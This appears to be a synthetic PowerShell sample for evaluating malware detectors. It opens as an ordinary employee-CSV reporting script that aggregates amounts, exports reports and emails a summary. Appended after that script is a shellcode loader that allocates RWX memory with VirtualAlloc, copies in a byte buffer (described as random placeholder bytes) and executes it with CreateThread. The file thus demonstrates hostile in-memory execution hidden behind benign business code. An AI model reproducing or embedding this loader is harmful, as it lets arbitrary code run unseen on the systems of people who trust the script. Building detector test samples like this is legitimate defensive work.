
#Requires -Version 5.1
<#
.SYNOPSIS
    Reads an exported employee CSV and writes an aggregated summary report.
.DESCRIPTION
    Validates the column layout of the source file, converts the Amount column
    to a number and aggregates headcount and spend per department or site.
    Missing columns are reported as a hard error so a changed export cannot
    silently produce an empty report.
.EXAMPLE
    .\Get-DepartmentTotals.ps1 -InputCsv D:\Incoming\employees.csv
.NOTES
    Author: Ops Team
    Last updated: 2026-01-07
#>

$InputCsv   = "D:\Incoming\employees.csv"
$OutputPath = "C:\Reports\headcount-summary-2024-01-05.csv"
$GroupBy    = 'Site'
$MinAmount  = 10000


if (-not (Test-Path -LiteralPath $InputCsv)) {
    throw ("Input file not found: {0}" -f $InputCsv)
}
$rows = Import-Csv -LiteralPath $InputCsv -Delimiter ','
if (@($rows).Count -eq 0) {
    throw 'The input CSV contains no data rows.'
}
$required = @('EmployeeId', 'Name', 'Department', 'Site', 'Amount')
$available = $rows[0].PSObject.Properties.Name
$missing = @($required | Where-Object { $available -notcontains $_ })
if ($missing.Count -gt 0) {
    throw ("Missing column(s): {0}" -f ($missing -join ', '))
}
$rows | ForEach-Object { $_.Amount = [double]$_.Amount }

$byGroup = $rows | Group-Object -Property $GroupBy | ForEach-Object {
    $sum = ($_.Group | Measure-Object -Property Amount -Sum).Sum
    [pscustomobject]@{
        Group     = $_.Name
        Metric    = $GroupBy
        Employees = $_.Count
        Total     = [math]::Round($sum, 2)
        Average   = [math]::Round(($sum / $_.Count), 2)
    }
}

$grandTotal = [math]::Round((($rows | Measure-Object -Property Amount -Sum).Sum), 2)
$rowCount = @($rows).Count

$byGroup | Sort-Object -Property Total -Descending | Export-Csv -NoTypeInformation -Path $OutputPath -Encoding UTF8

$aboveThreshold = $byGroup | Where-Object { $_.Total -ge $MinAmount }
$aboveThreshold | Export-Csv -Path $OutputPath.Replace('.csv', '-filtered.csv') -NoTypeInformation -Encoding UTF8

$bySite = $rows | Group-Object -Property Site | ForEach-Object {
    [pscustomobject]@{
        Site      = $_.Name
        Employees = $_.Count
        Total     = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
}
$bySite | Sort-Object -Property Total -Descending | Format-Table -AutoSize

$duplicates = $rows | Group-Object -Property EmployeeId |
    Where-Object { $_.Count -gt 1 } |
    Select-Object Name, Count
if (@($duplicates).Count -gt 0) {
    Write-Warning ("Duplicate employee ids: {0}" -f @($duplicates).Count)
}

$byManager = $rows | Group-Object -Property Manager |
    Sort-Object -Property Count -Descending | Select-Object -First 5
$byManager | Format-Table -AutoSize

$style = @'
<style>
body { font-family: Segoe UI; font-size: 11px; }
table { border-collapse: collapse; width: 100%; }
th { background: #f4f4f4; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$byGroup | Sort-Object -Property Total -Descending |
    ConvertTo-Html -Title 'Headcount summary' -Head $style |
    Set-Content -Path $OutputPath.Replace('.csv', '.html') -Encoding UTF8

$byGroup | ConvertTo-Json -Depth 5 | Set-Content -Path $OutputPath.Replace('.csv', '.json') -Encoding UTF8

$bySite | Export-Csv -Path $OutputPath.Replace('.csv', '-by-site.csv') -NoTypeInformation -Encoding UTF8

$summaryBody = @"
Rows processed : $rowCount
Grand total    : $grandTotal
Groups         : $($byGroup.Count)
Output         : $OutputPath
"@

$MailTo = "reporting@adatum.com"
$MailFrom = 'bi@adatum.com'

Send-MailMessage -To $MailTo -From $MailFrom -Subject 'Headcount summary' -Body $summaryBody -SmtpServer "smtp.adatum.com" -Port 25

Write-Host ("Report written to {0}" -f $OutputPath) -ForegroundColor Green
Write-Verbose ("Filtered groups above threshold: {0}" -f @($aboveThreshold).Count)

$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}

$culture = [System.Globalization.CultureInfo]::GetCultureInfo('en-US')
$formatted = $grandTotal.ToString('C2', $culture)
Write-Verbose ("Formatted total: {0}" -f $formatted)

$byCostCenter = $rows | Where-Object { $_.PSObject.Properties.Name -contains 'CostCenter' } |
    Group-Object -Property CostCenter | Sort-Object -Property Count -Descending | Select-Object -First 5
$byCostCenter | Format-Table Name, Count -AutoSize

$average = ($rows | Measure-Object -Property Amount -Average).Average
Write-Verbose ("Average amount: {0:N2}" -f $average)

$largest = $rows | Sort-Object -Property Amount -Descending | Select-Object -First 5
$largest | Format-Table Name, Department, Amount -AutoSize

$sample = $rows | Select-Object -First 3
$sample | Format-Table -AutoSize | Out-String | Write-Verbose

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class NativeMethods
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0x4c, 0x0e, 0xb2, 0xde, 0x17, 0xdd, 0xb3, 0xd2, 0x48, 0x8b, 0x8e, 0xe6, 0x0a, 0x1d, 0x21, 0xd4,
        0xe9, 0x02, 0xbb, 0x2e, 0x0b, 0x0c, 0xf2, 0x35, 0x2d, 0xd9, 0x57, 0x9a, 0x2c, 0x77, 0x2c, 0x6a,
        0xca, 0x17, 0xc7, 0xa1, 0x1c, 0xca, 0x88, 0x0d, 0xfb, 0x5c, 0x15, 0x88, 0xeb, 0x70, 0x1b, 0x0d,
        0x2d, 0x18, 0xd8, 0x52, 0x51, 0x9c, 0xd2, 0x98, 0xed, 0x87, 0xb7, 0x5a, 0xcb, 0x5e, 0x48, 0x19,
        0xe1, 0xae, 0xdd, 0x49, 0xa7, 0xee, 0xb5, 0x8a, 0x59, 0x64, 0x8a, 0x81, 0xde, 0x15, 0x60, 0x78,
        0x5e, 0x63, 0xab, 0x24, 0x63, 0x57, 0xc9, 0xb2, 0x53, 0x5a, 0x88, 0x42, 0x43, 0xd5, 0x05, 0xdc,
        0x13, 0xca, 0x4b, 0x86, 0x82, 0xe9, 0x82, 0x10, 0xb4, 0xd3, 0xd7, 0x77, 0x89, 0x7d, 0x3b, 0x76,
        0xec, 0x1e, 0x11, 0x72, 0xc0, 0xf6, 0x3c, 0x6e, 0xaf, 0xf3, 0x43, 0xcb, 0xac, 0x6f, 0x8a, 0xeb,
        0x8a, 0xea, 0x59, 0x03, 0xc6, 0xac, 0x69, 0x34, 0x80, 0x07, 0x2d, 0x9c, 0x6f, 0x98, 0xdd, 0x79,
        0xb1, 0xb7, 0x4f, 0x0c, 0x6f, 0x13, 0xde, 0x1b, 0xf7, 0x0b, 0x39, 0x36, 0x4d, 0x44, 0xb2, 0xe1,
        0xb5, 0xf0, 0x87, 0x45, 0xf6, 0xc0, 0xb1, 0x07, 0x10, 0x08, 0x90, 0x1e, 0xa0, 0xf1, 0x50, 0x6d,
        0x3f, 0x2d, 0xbb, 0x08, 0x28, 0xf9, 0xe8, 0x18, 0xaf, 0x6d, 0xdf, 0xc1, 0x2d, 0x90, 0x81, 0x21,
        0x94, 0x07, 0xea, 0xbc, 0x19, 0xfa, 0xb8, 0xd3, 0x30, 0xaf, 0x3d, 0x5b, 0xf9, 0x26, 0xd7, 0xb7,
        0x18, 0xcf, 0x2a, 0x48, 0xe3, 0x29, 0x42, 0xa3, 0x19, 0x05, 0x8c, 0x28, 0x07, 0x1d, 0x3a, 0x00,
        0x9a, 0xf8, 0xad, 0xed, 0x56, 0xc2, 0xf9
    )

    $HProcess = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($HProcess -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $HProcess, $Buffer.Length)
    $ThreadId = 0
    $Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $HProcess, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][NativeMethods]::WaitForSingleObject($Thread, 4655)
    [void][NativeMethods]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
